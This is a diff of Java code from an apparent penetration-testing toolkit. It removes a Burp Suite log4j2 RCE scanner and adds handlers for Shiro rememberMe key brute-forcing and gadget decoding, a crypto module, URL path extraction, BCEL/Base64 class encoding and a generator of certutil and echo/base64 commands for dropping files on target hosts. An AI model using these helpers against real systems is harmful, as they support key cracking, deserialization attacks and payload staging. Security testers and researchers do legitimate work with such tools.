-                                                        "log4j2 RCE",
-                                                        "log4j2 RCE" + param_vuln,
-                                                        "High"
-                                                ));
-//                                return issues;
-                                            }
-                                        }
-                                    } catch (IOException ee) {
-                                        ee.printStackTrace();
-                                    }
-                                }
-
-                                if (BurpExtender.this.privatedns && !BurpExtender.this.isip) { // privatedns 的dnslog记录
-
-                                    String words_vuln = firstheaders[0].trim().toLowerCase() + "." + finalHost.trim() + finalUri.trim();
-                                    if (words_vuln.length() > 20)
-                                        words_vuln = words_vuln.substring(words_vuln.length() - 20);
-                                    OkHttpClient client = new OkHttpClient();
-                                    String indexUrl = finalPrivatednsResponseurl.trim();
-                                    Request loginReq = new Request.Builder()
-                                            .url(indexUrl)
-                                            .get()
-                                            .build();
-
-                                    Call call = client.newCall(loginReq);
-                                    try {
-                                        Robot r = new Robot();
-                                        r.delay(2500);
-                                    } catch (AWTException e) {
-                                        e.printStackTrace();
-                                    }
-                                    Response response2 = null;
-                                    try {
-                                        response2 = call.execute();
-                                    } catch (IOException e) {
-                                        e.printStackTrace();
-                                    }
-                                    try {
-                                        assert response2 != null;
-                                        String respCookie = Objects.requireNonNull(response2.body()).string(); // dnslog的响应体
-                                        String param_vuln = "";
-                                        if (respCookie.contains(words_vuln) && respCookie.contains(finalIj - 1 + "."  + finalIii + "."  + logxn_dnslog.trim())) {
-                                            // 0.17.2更新参数点显示
-                                            for (int param_vuln_i = finalParam_i - 1; param_vuln_i >= 0; param_vuln_i--) {
-//                                        stdout.println(param_vuln_i);
-                                                if (respCookie.contains("\"" + param_vuln_i + "." + firstheaders[0].trim().toLowerCase())) {
-                                                    param_vuln = param_vuln + "param " + param_vuln_i + " is vulned ";
-                                                }
-                                            }
-                                            synchronized (BurpExtender.this.Udatas) {
-                                                int row = BurpExtender.this.Udatas.size();
-                                                BurpExtender.this.Udatas.add(new TablesData(row, reqMethod, url.toString(), BurpExtender.this.helpers.analyzeResponse(response).getStatusCode() + "", "log4j2 rce " + param_vuln, newIHttpRequestResponse, httpService.getHost(), httpService.getPort()));
-                                                fireTableRowsInserted(row, row);
-                                                List<IScanIssue> issues = new ArrayList(1);
-                                                issues.add(new CustomScanIssue(
-                                                        httpService,
-                                                        url,
-                                                        new IHttpRequestResponse[]{newIHttpRequestResponse},
-                                                        "log4j2 RCE",
-                                                        "log4j2 RCE " + param_vuln,
-                                                        "High"
-                                                ));
-                                            }
-                                        }
-                                    } catch (IOException e) {
-                                        e.printStackTrace();
-                                    }
-                                }
-                            }
-                        }.start();
-                    }
-//                }
-            }
-        });
-        return jMenuItemList;
-    }
-
-    public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
-        return null;
-    }
-
-    public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
-        if (existingIssue.getIssueName().equals(newIssue.getIssueName()))
-            return -1;
-        return 0;
-    }
-
-    public IHttpService getHttpService() {
-        return this.currentlyDisplayedItem.getHttpService();
-    }
-
-    public byte[] getRequest() {
-        return this.currentlyDisplayedItem.getRequest();
-    }
-
-    public byte[] getResponse() {
-        return this.currentlyDisplayedItem.getResponse();
-    }
-
-    public String getTabCaption() {
-        return "log4j2 RCE";
-    }
-
-    public Component getUiComponent() {
-        return this.mjSplitPane;
-    }
-
-    public int getRowCount() {
-        return this.Udatas.size();
-    }
-
-    public int getColumnCount() {
-        return 5;
-    }
-
-    public String getColumnName(int columnIndex) {
-        switch (columnIndex) {
-            case 0:
-                return "#";
-            case 1:
-                return "Method";
-            case 2:
-                return "URL";
-            case 3:
-                return "Status";
-            case 4:
-                return "Issue";
-        }
-        return null;
-    }
-
-    public Object getValueAt(int rowIndex, int columnIndex) {
-        TablesData datas = this.Udatas.get(rowIndex);
-        switch (columnIndex) {
-            case 0:
-                return Integer.valueOf(datas.Id);
-            case 1:
-                return datas.Method;
-            case 2:
-                return datas.URL;
-            case 3:
-                return datas.Status;
-            case 4:
-                return datas.issue;
-        }
-        return null;
-    }
-
-
-
-    public class URLTable extends JTable {
-        public URLTable(TableModel tableModel) {
-            super(tableModel);
-        }
-
-        public void changeSelection(int row, int col, boolean toggle, boolean extend) {
-            BurpExtender.TablesData dataEntry = BurpExtender.this.Udatas.get(convertRowIndexToModel(row));
-            BurpExtender.this.HRequestTextEditor.setMessage(dataEntry.requestResponse.getRequest(), true);
-            BurpExtender.this.HResponseTextEditor.setMessage(dataEntry.requestResponse.getResponse(), false);
-            BurpExtender.this.currentlyDisplayedItem = dataEntry.requestResponse;
-            super.changeSelection(row, col, toggle, extend);
         }
     }
 
-    public static class TablesData {
-        final int Id;
+    // shiro rememberme参数解密
+    public void onButton29Click(ActionEvent actionEvent) throws Exception {
+        byte[] fileContents;
+        String total = "";
+        String key ;
+        SerializationDumper sd = new SerializationDumper();
+        String rememberMe = mTextArea27.getText().trim();
+        Expdecode shiroDecypt = new Expdecode();
+        try {
+            if (mRadiobutton11.isSelected()) {
+                fileContents = shiroDecypt.BruteCipherKeygcm( rememberMe , "property/keys.conf");
+                key = shiroDecypt.BruteCipherKeygcm( rememberMe , "property/keys.conf", "1");
+            } else {
+                fileContents = shiroDecypt.BruteCipherKey( rememberMe , "property/keys.conf");
+                key = shiroDecypt.BruteCipherKey( rememberMe , "property/keys.conf", "1");
+            }
 
-        final String Method;
+            mTextField13.setText(key);
 
-        final String URL;
+            for (int i = 0; i < fileContents.length; ++i) {
+                sd._data.add(fileContents[i]);
+            }
 
-        final String Status;
+            sd._enablePrinting = false;
+            sd.parseStream();
 
-        final String issue;
+            String[] command = new String[100];
+            command[0] = "java";
+            command[1] = "-jar";
+            command[2] = "property/fernflower.jar";
+            command[3] = "property/bytecodes.class";
+            command[4] = "property/";
+            String[] commands = deleteArrayNull(command); // class反编译变成java命令
 
-        final IHttpRequestResponse requestResponse;
+            try {
+                Process pro = Runtime.getRuntime().exec(commands);
+                Robot r = new Robot();
+                r.delay(3000);
+                File f = new File("property/bytecodes.java");
 
-        final String host;
+                File f2 = new File( "property/bytecodes.class");
+                File f3 = new File( "property/shiro.ser");
+//            System.out.println(tempPath + "/property/shiro.ser");
 
-        final int port;
+//                System.out.println(f3.delete());
+                System.out.println(f2.delete());
+                if ( f.exists() && f.length() > 0L) {
+                    System.out.println("[+] 使用的Gadeget为TemplatesImpl，bytecodes中的代码存放在bytecodes.class，可直接用idea等查看");
+                    String s = null;
+                    BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(f)));
+                    while((s = br.readLine()) != null) {
+                        total = total + s + "\n";
+                    }
+                    br.close();
+                    mTextArea28.setText(total);
+                    System.out.println(f.delete());
+                } else {
+                    mTextArea28.setText("[+] 序列化数据存放在shiro.ser，可使用xxd shiro.ser来查找感兴趣的内容");
+                    System.out.println("[+] 序列化数据存放在shiro.ser，可使用xxd shiro.ser来查找感兴趣的内容");
+                }
 
-        public TablesData(int id, String method, String url, String status, String issue, IHttpRequestResponse requestResponse, String host, int port) {
-            this.Id = id;
-            this.Method = method;
-            this.URL = url;
-            this.Status = status;
-            this.issue = issue;
-            this.requestResponse = requestResponse;
-            this.host = host;
-            this.port = port;
+
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+
+        }catch (Exception e){
+            mTextArea28.setText("解密失败，请确认是否可解密或默认key无法解密");
+        }
+
+
+
+    }
+
+    // 加解密模块-解密
+    public void onButton30Click(ActionEvent actionEvent) throws Exception {
+        String encodemode = (String) mChoiceBox1.getValue(); // AES / DES / DESede
+        String ivmode = (String) mChoiceBox2.getValue(); // iv模式 ECB / CBC
+        String paddingmode = (String) mChoiceBox3.getValue(); // 填充模式
+        String sSrcmode = (String) mChoiceBox4.getValue(); // 密文编码
+        String keyivmode = (String) mChoiceBox5.getValue(); // key iv编码
+
+        String skey = mTextField14.getText().trim(); // key 密钥
+        String iv = mTextField15.getText().trim(); // iv
+        String sSrc = mTextArea29.getText().trim(); // 密文
+
+        if (mRadiobutton10.isSelected()){
+            String dDes2 = decryptbuwei(sSrc, skey, iv, encodemode, ivmode, paddingmode, sSrcmode, keyivmode);
+            mTextArea30.setText(dDes2);
+        }else {
+            if (keyivmode.equals("Base64")) { // 根据key iv的模式进行选择
+                String dDes2 = decryptJsCode(sSrc, skey, iv, encodemode, ivmode, paddingmode, sSrcmode, keyivmode);
+                mTextArea30.setText(dDes2);
+            }else if(keyivmode.equals("Hex")){
+                String dDes2 = decryptJsCode(sSrc, skey, iv, encodemode, ivmode, paddingmode, sSrcmode, keyivmode);
+                mTextArea30.setText(dDes2);
+            }else {
+                String dDes = decrypt(sSrc, skey, iv, encodemode, ivmode, paddingmode, sSrcmode);
+                mTextArea30.setText(dDes);
+            }
         }
     }
 
-}
+    // 加解密模块-加密
+    public void onButton31Click(ActionEvent actionEvent) throws Exception {
+        String encodemode = (String) mChoiceBox1.getValue(); // AES / DES / DESede
+        String ivmode = (String) mChoiceBox2.getValue(); // iv模式 ECB / CBC
+        String paddingmode = (String) mChoiceBox3.getValue(); // 填充模式
+        String sSrcmode = (String) mChoiceBox4.getValue(); // 密文编码
+        String keyivmode = (String) mChoiceBox5.getValue(); // key iv编码
 
-
-
-
-
-class CustomScanIssue implements IScanIssue
-{
-    private IHttpService httpService;
-    private URL url;
-    private IHttpRequestResponse[] httpMessages;
-    private String name;
-    private String detail;
-    private String severity;
-
-    /**
-     *
-     * @param httpService   HTTP服务
-     * @param url   漏洞url
-     * @param httpMessages  HTTP消息
-     * @param name  漏洞名称
-     * @param detail    漏洞细节
-     * @param severity  漏洞等级
-     */
-    public CustomScanIssue(
-            IHttpService httpService,
-            URL url,
-            IHttpRequestResponse[] httpMessages,
-            String name,
-            String detail,
-            String severity)
-    {
-        this.httpService = httpService;
-        this.url = url;
-        this.httpMessages = httpMessages;
-        this.name = name;
-        this.detail = detail;
-        this.severity = severity;
+        String skey = mTextField14.getText().trim(); // key 密钥
+        String iv = mTextField15.getText().trim(); // iv
+        String sSrc = mTextArea30.getText().trim(); // 明文
+        if (mRadiobutton10.isSelected()){
+            String dDes2 = encryptbuwei(sSrc,"123" ,skey, iv, encodemode, ivmode, paddingmode, sSrcmode, keyivmode);
+            mTextArea29.setText(dDes2);
+        }else {
+            if (keyivmode.equals("Base64")) { // 根据key iv的模式进行选择
+                String dDes2 = encryptJsUserInfo(sSrc, skey, iv, encodemode, ivmode, paddingmode, sSrcmode, keyivmode);
+                mTextArea29.setText(dDes2);
+            } else if (keyivmode.equals("Hex")) { // 根据key iv的模式进行选择
+                String dDes2 = encryptJsUserInfo(sSrc, skey, iv, encodemode, ivmode, paddingmode, sSrcmode, keyivmode);
+                mTextArea29.setText(dDes2);
+            }else {
+                String dDes = encrypt(sSrc, skey, iv, encodemode, ivmode, paddingmode, sSrcmode);
+                mTextArea29.setText(dDes);
+            }
+        }
     }
 
-    public URL getUrl()
-    {
-        return url;
+    // 提取路径模块
+    public void onButton32Click(ActionEvent actionEvent) throws Exception {
+        proxy();
+        String pattern = "(http[s]{0,1}://.*?)/|(http[s]{0,1}://.*)"; // 匹配域名
+        String url = mTextField20.getText().trim();
+        String pat = mTextArea34.getText().trim();
+        String black_lists = mTextArea33.getText().trim(); // 黑名单
+        String input = mTextArea31.getText().trim(); // 输入or url，匹配一个
+
+        String total = "";
+        String total2 = "";
+        String[] url_list;
+        test7.vullist = new ArrayList();
+
+        if (pat.contains(".")){
+
+            String[] pats = pat.split("\n");
+            for( String str: pats) {
+                total = total + str.replace(".", "\\.");
+                total = total + ".*?|";
+            }
+            pat = "(" + total.substring(0,total.length()-1) + ")";
+
+        }else{
+            if (pat.equals(""))
+                pat = "/";
+        }
+        if (!url.equals("")) {
+            // 创建 Pattern 对象
+            Pattern r = Pattern.compile(pattern);
+            // 现在创建 matcher 对象
+            Matcher m = r.matcher(url);
+            m.find();
+            String host = m.group(); // 获取协议+域名
+            Set<String> response = extractLists(url, pat);
+            url_list = new ArrayList<>(response).toArray(new String[0]);
+            for (int i = 0; i < url_list.length; i++) {
+                test7.vullist.add(url_list[i]);
+                if (!url_list[i].contains("http"))
+                    url_list[i] = host.substring(0, host.length() - 1) + url_list[i];
+            }
+            test7 a = new test7();
+            a.getUriList( url_list , pat );
+            String[] blacklists = black_lists.split("\n");
+            Set<String> total_lists = new HashSet<>();
+
+            for (String strr: test7.vullist) {
+                String isblack = "0";
+                for (String str:blacklists) { // 剔除黑名单
+                    if (strr.contains(str))
+                        isblack = "1";
+                }
+                if (isblack.equals("0"))
+                    total_lists.add(strr.trim());
+            }
+            for (String strr: total_lists) {
+                total2 = total2 + strr + "\n";
+            }
+        }
+        else{
+            Set<String> response = extractListsinput(input, pat);
+            url_list = new ArrayList<>(response).toArray(new String[0]);
+
+            String[] blacklists = black_lists.split("\n");
+            Set<String> total_lists = new HashSet<>();
+
+            for (String strr : url_list) {
+                String isblack = "0";
+                if (!black_lists.equals(""))
+                    for (String str : blacklists) { // 剔除黑名单
+                        if (strr.contains(str))
+                            isblack = "1";
+                    }
+                if (isblack.equals("0"))
+                    total_lists.add(strr.trim());
+            }
+            for (String strr : total_lists) {
+                total2 = total2 + strr + "\n";
+            }
+        }
+        System.out.println(total2);
+        mTextArea32.setText(total2.trim());
+
     }
 
-    public String getIssueName()
-    {
-        return name;
+    // 生成python路径
+    public void onButton12Click(ActionEvent actionEvent) throws IOException {
+        String python2path = mTextField8.getText().trim(); // python2 路径
+        String python3path = mTextField82.getText().trim(); // python3 路径
+        String cspayload = mTextField9.getText().trim();
+        String pocsuitepath = mTextField83.getText().trim(); // pocsuite 路径
+
+        String jarPath = Main.class.getProtectionDomain().getCodeSource().getLocation().getFile(); // 获取config.properties文件路径
+
+        String os = System.getProperty("os.name");
+
+        if (!jarPath.contains(".jar") && !os.toLowerCase().startsWith("win")) {
+
+            System.out.println("无jar，不修改");
+
+        }else if(os.toLowerCase().startsWith("win")){
+            String target = "python2path=" + python2path + '\n' + "python3path=" + python3path + '\n' + "cspayload=" + cspayload +  '\n' + "pocsuite=" + pocsuitepath;
+            poctoFile(target, "property/config.properties");
+
+        }else{
+            Properties prop = new Properties();
+            prop.load(Main.class.getResourceAsStream("/config.properties"));  // 读取源文件
+
+            prop.setProperty("python2path", python2path);
+            prop.setProperty("python3path", python3path);
+            prop.setProperty("pocsuite", pocsuitepath);
+            String tempPath = jarPath.substring(0, jarPath.lastIndexOf("/")) + "/config.properties";
+
+            System.out.println(tempPath);
+            Writer w = new FileWriter(tempPath);
+            prop.store(w, "python run path");
+            w.close();
+            String[] command = new String[100];
+            command[0] = "jar";
+            command[1] = "uf";
+            command[2] = Main.class.getProtectionDomain().getCodeSource().getLocation().getFile();
+            command[3] = "config.properties";
+            // jar uf esjavaclient-0.0.1-SNAPSHOT.jar config.properties 替换jar里面的config.properties文件
+
+            String[] commands = deleteArrayNull(command);
+            for (String s : commands)
+                System.out.println(s);
+
+            try {
+                Process pro = Runtime.getRuntime().exec(commands);
+                String[] command2 = new String[100];
+                Robot r = new Robot();
+                r.delay(500);
+                command2[0] = "rm";
+                command2[1] = tempPath;
+                String[] commands2 = deleteArrayNull(command2);
+                Process pro2 = Runtime.getRuntime().exec(commands2);
+
+            } catch (Exception e) {
+                // TODO: handle exception
+            }
+        }
     }
 
-    public int getIssueType()
-    {
-        return 0;
+    public void onButton33Click(ActionEvent actionEvent) throws Exception {
+        Stage stage=new Stage();
+        FileChooser fileChooser = new FileChooser();
+        //fileChooser.getExtensionFilters().addAll(
+        //        new FileChooser.ExtensionFilter("HTML", "*.class"),
+        //        new FileChooser.ExtensionFilter("HTML", "*.txt")
+        //);
+        File file2 = fileChooser.showOpenDialog(stage);
+
+        try {
+            mLabel5.setText(file2.getAbsolutePath() );
+
+            mTextArea35.setText(Base64Encode(file2));
+
+            mTextArea36.setText(bytesEncode(file2));
+
+            mTextArea37.setText(bcelEncodeclass(file2));
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
     }
 
-    public String getSeverity()
-    {
-        return severity;
+    @FXML
+    // 文件写入模块
+    // mTextArea38_input 输入命令自动出相应的转码命令
+    public void fileWriteEncode(KeyEvent event) throws FileNotFoundException, UnsupportedEncodingException {
+        String mTextArea38content = mTextArea38_input.getText().trim();
+        StringBuilder total = new StringBuilder();
+        StringBuilder total2 = new StringBuilder();
+        if (mTextArea38content.equals("")) {
+            mTextArea38.setText("");
+            mTextArea39.setText("");
+            mTextArea40.setText("");
+            mTextArea41.setText("");
+            mTextArea42.setText("");
+            mTextArea43.setText("");
+            mTextArea44.setText("");
+        }else {
+            if (mTextArea38content.contains("\n")) {
+                String[] cmds = mTextArea38content.split("\n");
+                for (String single_cmd : cmds) {
+                    String single_echo = "set /p= " + single_cmd.replace("<", "^<").replace(">", "^>").replace("&", "^&").replace("|", "^|") + "<nul >> 1.xxx&";
+                    total.append(single_echo);
+
+                    String single_echo2 = "echo " + single_cmd.replace("<", "^<").replace(">", "^>").replace("&", "^&").replace("|", "^|") + " >> 1.xxx&";
+                    total2.append(single_echo2);
+                }
+                // set write
+                mTextArea38.setText(  total.substring(0, total.length() - 1)  );
+
+                // echo write
+                mTextArea39.setText(  total2.substring(0, total2.length() - 1) );
+
+                // certutil base64
+                String base64encodedString = Base64.getEncoder().encodeToString(mTextArea38content.getBytes(StandardCharsets.UTF_8));
+                mTextArea40.setText("echo " + base64encodedString + " > 111.txt\n\ncertutil -f -decode 111.txt C:\\\\111.xxx");
+
+                // certutil hex
+                mTextArea41.setText("echo " + str2HexStr(mTextArea38content,"utf-8").toLowerCase() + " > 111.txt\n\ncertutil -decodehex 111.txt C:\\\\111.xxx");
+
+                // echo write linux
+                mTextArea42.setText("echo '" + mTextArea38content.replace("'","\\47").replace("\n","\\n") + "' > 111.xxx");
+
+                // echo Base64 linux
+                mTextArea43.setText("echo " + base64encodedString + " |base64 -d > 111.xxx");
+
+                // echo Hex  linux
+                mTextArea44.setText("echo " + str2HexStr(mTextArea38content,"utf-8").toLowerCase() + "|xxd -r -ps > 111.xxx");
+
+
+            }else {
+                // set write
+                mTextArea38.setText("set /p=" + mTextArea38content.replace("<", "^<").replace(">", "^>").replace("&", "^7").replace("|", "^|") + "<nul > C:\\11.txt");
+
+                // echo write
+                mTextArea39.setText("echo " + mTextArea38content.replace("<", "^<").replace(">", "^>").replace("&", "^7").replace("|", "^|").replace("\n", "\\n") + " > 111.xxx");
+
+                // certutil base64
+                String base64encodedString = Base64.getEncoder().encodeToString(mTextArea38content.getBytes(StandardCharsets.UTF_8));
+                mTextArea40.setText("echo " + base64encodedString + " > 111.txt\n\ncertutil -f -decode 111.txt C:\\\\111.xxx");
+
+                // certutil hex
+                mTextArea41.setText("echo " + str2HexStr(mTextArea38content, "utf-8").toLowerCase() + " > 111.txt\n\ncertutil -decodehex 111.txt C:\\\\111.xxx");
+
+                // echo write linux
+                mTextArea42.setText("echo '" + mTextArea38content.replace("'", "\\47").replace("\n", "\\n") + "' > 111.xxx");
+
+                // echo Base64 linux
+                mTextArea43.setText("echo " + base64encodedString + " |base64 -d > 111.xxx");
+
+                // echo Hex  linux
+                mTextArea44.setText("echo " + str2HexStr(mTextArea38content, "utf-8").toLowerCase() + "|xxd -r -ps > 111.xxx");
+
+            }
+        }
     }
 
-    public String getConfidence()
-    {
-        return "Certain";
-    }
-
-    public String getIssueBackground()
-    {
-        return null;
-    }
-
-    public String getRemediationBackground()
-    {
-        return null;
-    }
-
-
-    public String getIssueDetail()
-    {
-        return detail;
-    }
-
-    public String getRemediationDetail()
-    {
-        return null;
-    }
-
-    public IHttpRequestResponse[] getHttpMessages()
-    {
-        return httpMessages;
-    }
-
-    public IHttpService getHttpService()
-    {
-        return httpService;
-    }
 }
